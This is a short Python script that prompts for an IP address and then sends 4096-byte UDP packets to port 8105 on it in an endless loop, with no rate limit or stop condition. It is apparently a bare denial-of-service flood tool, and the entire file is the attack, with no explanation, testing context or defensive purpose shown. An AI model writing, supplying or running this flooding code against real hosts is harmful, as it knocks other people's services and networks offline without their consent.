import socket

ip = input("Enter IP: ")

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = 'a' * 4096
    while True:
        sock.sendto(message.encode(), (ip, 8105))

main()